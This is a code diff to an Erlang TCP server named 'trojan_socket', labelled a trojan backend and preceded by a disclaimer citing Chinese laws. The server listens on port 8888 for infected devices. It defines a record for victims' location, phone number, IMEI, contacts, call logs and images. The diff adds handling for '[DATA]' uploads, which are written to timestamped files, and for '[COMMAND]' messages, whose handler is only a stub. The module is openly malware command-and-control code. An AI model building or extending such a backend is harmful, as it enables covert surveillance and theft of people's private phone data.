@@ -16,7 +16,7 @@
 %%
 %% - 《中华人民共和国网络安全法》 第十二条：任何个人和组织不得利用网络
 %%   从事危害国家安全、荣誉和利益，煽动颠覆国家政权等违法犯罪活动。
-%% - 《中华人民共和国刑法》 第二百八十五条至二百八十七条：
+%% - 《中华人民共和国刑法》 第二百八十五条至第二百八十七条：
 %%   非法侵入计算机信息系统、破坏系统功能或数据的行为将被追究刑事责任。
 %% - 《中华人民共和国数据安全法》 第三条、第十七条：
 %%   从事数据处理活动应当依法保障数据安全，禁止非法获取、泄露数据。
@@ -46,26 +46,36 @@
 %% 默认IP地址：0.0.0.0
 
 -module(trojan_socket).
+
 -export([start/0]).
 -export([create_schema/0, create_table/0]).
+-export([
+    ip_to_string/1,
+    write_file/2, 
+    random_color/0, 
+    log/3,
+    getCurrentLocalIPAddr/0
+]).
 
--define(DEFAULT_NAME, "木马后台").
--define(DEFAULT_PORT, 8888).
--define(DEFAULT_IP, {0,0,0,0}).
--define(DEFAULT_BUFSIZE, 1024).
+% 定义默认配置参数
+-define(DEFAULT_NAME, "木马后台").    % 服务器默认名称
+-define(DEFAULT_PORT, 8888).         % 默认监听端口
+-define(DEFAULT_IP, {0,0,0,0}).      % 默认监听IP（所有网卡）
+-define(DEFAULT_BUFSIZE, 1024).      % 默认缓冲区大小
 
+% 设备信息记录结构，用于存储连接设备的各种信息
 -record(device_info, {
-    id,                 % integer() 或 string()
-    ip,                 % string()
-    image,              % string() (路径/Base64)
-    current_location,   % string()
-    phone_number,       % string()
-    phone_model,        % string()
-    os_version,         % string()
-    network_carrier,    % string()
-    imei_number,        % string()
-    contacts,           % string() (JSON 形式)
-    call_logs           % string() (JSON 形式)
+    id,                 % 设备唯一标识符（整数或字符串）
+    ip,                 % 设备IP地址
+    image,              % 设备截图或图片（Base64编码或文件路径）
+    current_location,   % 当前地理位置
+    phone_number,       % 手机号码
+    phone_model,        % 手机型号
+    os_version,        % 操作系统版本
+    network_carrier,   % 网络运营商
+    imei_number,       % IMEI号码
+    contacts,          % 通讯录（JSON格式）
+    call_logs          % 通话记录（JSON格式）
 }).
 
 % ANSI 颜色代码 - 我们的小彩虹糖果盒！🍬🌈
@@ -73,71 +83,126 @@
 -define(ANSI_RED, "\e[31m").        % 热情的小红唇 💋
 -define(ANSI_GREEN, "\e[32m").      % 清新的小绿叶 🌿
 -define(ANSI_YELLOW, "\e[33m").     % 暖暖的小太阳 ☀️
--define(ANSI_BLUE, "\e[34m").       % 温柔的蓝天白云 ☁️ (这个先留着，以后想用别的颜色就可以啦)
+-define(ANSI_BLUE, "\e[34m").       % 温柔的蓝天白云 ☁️
+-define(ANSI_MAGENTA, "\e[35m").    % 可爱的小粉花 🌸
+-define(ANSI_CYAN, "\e[36m").       % 清澈的小溪水 💧
+-define(ANSI_WHITE, "\e[37m").      % 纯洁的小白兔 🐰
+
+% 随机选择一个颜色的小函数～
+random_color() ->
+    Colors = [
+        ?ANSI_RED, ?ANSI_GREEN, ?ANSI_YELLOW, 
+        ?ANSI_BLUE, ?ANSI_MAGENTA, ?ANSI_CYAN, 
+        ?ANSI_WHITE
+    ],
+    lists:nth(rand:uniform(length(Colors)), Colors).
 
 % 新增的日志辅助函数，萌萌哒～
+% 日志记录函数，支持不同级别的日志（info、warning、error）
+% 每种级别使用不同的颜色，让日志更直观
 log(Level, FormatString, Args) ->
+    % 获取当前时间戳
     {{Y,Mo,D},{H,M,S}} = calendar:local_time(),
+    % 格式化时间戳
     Timestamp = io_lib:format("~4..0w-~2..0w-~2..0w ~2..0w:~2..0w:~2..0w", [Y,Mo,D,H,M,S]),
+    % 转换日志级别为字符串
     LevelStr = if
         is_atom(Level) -> atom_to_list(Level);
         is_list(Level) -> Level
     end,
 
-    % 根据日志级别选个漂亮的颜色吧～
+    % 根据日志级别选择颜色
     Color = case Level of
-        info    -> ?ANSI_GREEN;  % 你看，info 消息是清新的绿色～
-        warning -> ?ANSI_YELLOW; % warning 消息是暖暖的黄色～
-        error   -> ?ANSI_RED;    % error 消息是醒目的红色～
-        _       -> ""           % 如果是别的级别，就先不用颜色啦
+        info    -> random_color();    % 普通信息用随机颜色
+        warning -> ?ANSI_YELLOW;      % 警告用黄色
+        error   -> ?ANSI_RED;         % 错误用红色
+        _       -> random_color()     % 其他级别随机选色
     end,
 
-    % 我们把时间戳和日志级别作为参数传给 io:format，
-    % FormatString 是你原来写的格式字符串，姐姐把它拼接到后面～
-    % 用选好的颜色把消息包起来，最后再用 ?ANSI_RESET 变回原来的颜色，这样就不会影响其他文字啦！
-    % 最后加上一个换行符 \n，让日志看起来整整齐齐！
-    io:format(Color ++ "~s [~s] " ++ FormatString ++ ?ANSI_RESET ++ "~n", [Timestamp, LevelStr | Args]).
+    % 输出带颜色的格式化日志
+    io:format(Color ++ "~s [~s] " ++ FormatString ++ ?ANSI_RESET ++ "~n", 
+             [Timestamp, LevelStr | Args]).
 
-% 这个新函数专门负责招待每一位连接上的"小可爱"哦
+% 处理新的客户端连接
 handle_connection(Socket) ->
+    % 获取客户端IP地址
     case inet:peername(Socket) of
         {ok, PeerIP} ->
-            log(info, "哇，有一个小可爱连接上啦！地址是: ~p", [PeerIP]);
+            log(info, "新的客户端连接，IP地址: ~p", [PeerIP]);
         {error, PeernameErrorReason} ->
-            log(error, "哎呀，获取小可爱地址失败了: ~p", [PeernameErrorReason])
+            log(error, "获取客户端IP地址失败: ~p", [PeernameErrorReason])
     end,
+    % 开始接收数据
     receive_all(Socket),
+    % 关闭连接
     gen_tcp:close(Socket),
-    log(info, "和小可爱的连接已温柔关闭。", []).
+    log(info, "客户端连接已关闭", []).
 
-% 新增：循环读取所有数据，直到 closed
+% 处理收到的命令
+handle_command(Command) ->
+    log(info, "收到命令: ~s", [Command]),
+    % 这里可以添加具体的命令处理逻辑
+    ok.
+
+% 循环接收客户端数据直到连接关闭
 receive_all(Socket) ->
-    log(info, "人家在等数据啦，Socket是: ~p", [Socket]),
+    log(info, "等待接收数据，Socket: ~p", [Socket]),
    
-    case gen_tcp:recv(Socket, 0, 5000) of  % Changed timeout to 5 seconds, and size to 0 for auto-size
+    case gen_tcp:recv(Socket, 0, 50000) of  % 50秒超时
         {ok, <<>>} ->
-            log(info, "一个字节都木有收到呢，继续等呀等～", []),
+            % 收到空数据，继续等待
+            log(info, "收到空数据，继续等待", []),
             receive_all(Socket);
         {ok, BinData} ->
-            log(info, "哇哦，二进制小宝贝来了: ~p", [BinData]),
+            % 收到二进制数据
+            log(info, "收到二进制数据: ~p", [BinData]),
+            
+            % 尝试将二进制数据转换为字符串
             case catch binary_to_list(BinData) of
                 Str when is_list(Str) ->
-                    log(info, "解码成字符串啦: ~s", [Str]);
+                    log(info, "数据解码成功: ~s", [Str]),
+                    % 检查是否包含数据标记
+                    case string:find(Str, "[DATA]") of
+                        nomatch ->
+                            % 检查是否包含命令标记
+                            case string:find(Str, "[COMMAND]") of
+                                nomatch ->
+                                    log(warning, "数据没有识别标签，忽略", []);
+                                _ ->
+                                    % 提取并处理命令
+                                    [_, Command] = string:split(Str, "[COMMAND]"),
+                                    log(info, "发现命令: ~s", [Command]),
+                                    handle_command(Command)
+                            end;
+                        _ ->
+                            % 提取并保存数据
+                            [_, Data] = string:split(Str, "[DATA]"),
+                            log(info, "提取的数据: ~s", [Data]),
+                            % 生成带时间戳的文件名
+                            {{Y, Mo, D}, {H, Mi, S}} = calendar:local_time(),
+                            Timestamp = io_lib:format(
+                                "~4..0w-~2..0w-~2..0w_~2..0w-~2..0w-~2..0w", 
+                                [Y, Mo, D, H, Mi, S]
+                            ),
+                            Filename = lists:flatten(Timestamp) ++ "_data.txt",
+                            write_file(Filename, Data)
+                    end,
+                    receive_all(Socket);
                 _ ->
-                    log(info, "这个数据人家转不成字符串啦～好可惜哦～", [])
-            end,
-            receive_all(Socket);
+                    log(error, "数据解码失败", []),
+                    receive_all(Socket)
+            end;
         {error, timeout} ->
-            log(warning, "等得花儿都谢啦，还是空空如也～嘤嘤嘤～", []);
+            log(warning, "接收超时", []);
         {error, closed} ->
-            log(info, "对方小可爱把连接关掉啦～", []);
+            log(info, "客户端关闭连接", []);
         {error, RecvErrorReason} ->
-            log(error, "哎呀，收消息的时候出小问题了: ~p", [RecvErrorReason])
+            log(error, "接收数据错误: ~p", [RecvErrorReason])
     end.
 
 % 这个新函数就是我们的“循环等待”魔法，让服务器能一直等待新的小可爱
 accept_loop(ListenSocket) ->
-    log(info, "服务器正在耐心等待新的小可爱连接中...", []), % 加个日志，表示正在等待
+    log(info, "服务器正在耐心等待新的小可爱连接中...", []), % 加个日志，表示正在等待 
     case gen_tcp:accept(ListenSocket) of
         {ok, Socket} ->
             % 有新的小可爱来啦！让 handle_connection 去招待它
@@ -152,26 +217,30 @@ accept_loop(ListenSocket) ->
     end.
 
 % start/0 函数现在变得更简洁啦，它负责开启监听，然后把招待客人的任务交给 accept_loop
+% 启动服务器
 start() ->
+    % 获取本地IP地址
+    getCurrentLocalIPAddr(),
+
+    % 启动Mnesia数据库
     mnesia:start(),
-    % 监听端口，如果失败了，我们就用新的log函数记录下来
+    
+    % 开始监听端口
     case gen_tcp:listen(?DEFAULT_PORT, [
-        binary,
-        {ip, ?DEFAULT_IP},
-        {packet, 0},
-        {active, false},  % Keep using passive mode
-        {reuseaddr, true},
-        {backlog, 5} % 等待队列里可以排5个小可爱
+        binary,                % 使用二进制模式
+        {ip, ?DEFAULT_IP},     % 监听所有网卡
+        {packet, 0},           % 原始数据模式
+        {active, false},       % 使用被动模式
+        {reuseaddr, true},     % 允许地址重用
+        {backlog, 5}           % 连接队列长度
     ]) of
         {ok, ListenSocket} ->
-            log(info, "服务器正在端口 ~p:~p 上悄悄监听哦...", [?DEFAULT_IP, ?DEFAULT_PORT]),
-            accept_loop(ListenSocket), % 把招待大任交给 accept_loop！
-            % 下面的代码只有在 accept_loop 因为某种原因停止后才会执行
-            % （比如 ListenSocket 被关闭了，或者 accept 出错了）
-            gen_tcp:close(ListenSocket), % 确保在服务结束时关闭监听套接字
-            log(info, "监听服务已正式停止，服务器晚安～", []);
+            log(info, "服务器启动成功，监听端口: ~p:~p", [?DEFAULT_IP, ?DEFAULT_PORT]),
+            accept_loop(ListenSocket),
+            gen_tcp:close(ListenSocket),
+            log(info, "服务器已停止", []);
         {error, ListenErrorReason} ->
-            log(error, "启动监听服务失败了，呜呜呜: ~p。服务器开不起来了。", [ListenErrorReason])
+            log(error, "服务器启动失败: ~p", [ListenErrorReason])
     end.
 
 create_table() ->
@@ -183,3 +252,54 @@ create_table() ->
 
 create_schema() ->
     mnesia:create_schema([node()]).
+
+write_file(Filename, Content) ->
+    case file:open(Filename, [append, write]) of
+        {ok, ExportFile} ->
+            ok = file:write(ExportFile, Content),
+            ok = file:write(ExportFile, "\n"),  % 保证每次写完都换行，清清楚楚
+            file:close(ExportFile),
+            ok;
+        {error, Reason} ->
+            log(error, "无法打开文件 ~p 进行写入: ~p", [Filename, Reason]),
+            {error, Reason}
+    end.
+
+getCurrentLocalIPAddr() ->
+    case inet:getifaddrs() of
+        {ok, Addrs} ->
+            % 遍历所有网卡接口，提取其中的 IP 地址
+            IPs = lists:flatmap(fun({_IfName, Props}) ->
+                % 从属性列表中找到所有的 addr 项
+                lists:filtermap(fun
+                    ({addr, {A,B,C,D}}) when is_integer(A), is_integer(B), 
+                                            is_integer(C), is_integer(D) ->
+
+                        % 只保留 IPv4 地址，并且不要 127.0.0.1
+                        case {A,B,C,D} of
+                            {127,0,0,1} -> false;  % 过滤掉本地回环地址
+                            _ -> {true, io_lib:format("~B.~B.~B.~B", [A,B,C,D])}  % 把IP转成点分格式的字符串～
+                        end;
+                        
+                    (_) -> false  % 忽略其他所有项
+                end, Props)
+            end, Addrs),
+
+            % 把所有 IP 打印出来，用漂亮的颜色～
+            case IPs of
+                [] ->
+                    log(warning, "咦？没找到可用的 IP 地址耶～", []);
+                _ ->
+                    lists:foreach(fun(IP) ->
+                        log(info, "🎯 发现本地 IP 地址啦 >>> [http://~s:~p] <<<", [IP, ?DEFAULT_PORT])
+                    end, IPs)
+            end,
+            IPs;
+
+        {error, Reason} ->
+            log(error, "❌ 获取 IP 地址失败了喵: ~p", [Reason]),
+            []
+    end.
+    
+ip_to_string({A, B, C, D}) ->
+    lists:flatten(io_lib:format("~p.~p.~p.~p", [A, B, C, D])).
